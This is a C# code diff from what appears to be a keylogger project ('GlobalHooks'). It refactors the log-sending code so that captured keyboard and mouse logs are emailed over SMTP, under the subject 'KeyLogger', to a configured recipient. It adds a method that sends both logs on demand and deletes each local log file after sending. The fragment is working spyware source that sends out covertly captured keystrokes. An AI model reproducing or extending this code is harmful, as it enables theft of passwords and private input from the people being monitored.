@@ -42,11 +42,22 @@ namespace GlobalHooks.Controllers
             }
         }
 
+        public void SendLogs()
+        {
+            Send(MouseLogFilePath);
+            Send(KeyboardLogFilePath);
+        }
+
         private void SendLog(string logFilePath)
+        {
+            if (new FileInfo(logFilePath).Length < _configuration.FileSize) return;
+            Send(logFilePath);
+        }
+
+        private void Send(string logFilePath)
         {
             if (string.IsNullOrEmpty(_configuration.To) || string.IsNullOrEmpty(_configuration.From) ||
                 string.IsNullOrEmpty(_configuration.Password)) return;
-            if (new FileInfo(logFilePath).Length < _configuration.FileSize) return;
             new SmtpController(_configuration.From, _configuration.Password).Send(@"KeyLogger", logFilePath,
                 _configuration.To);
             new FileInfo(logFilePath).Delete();
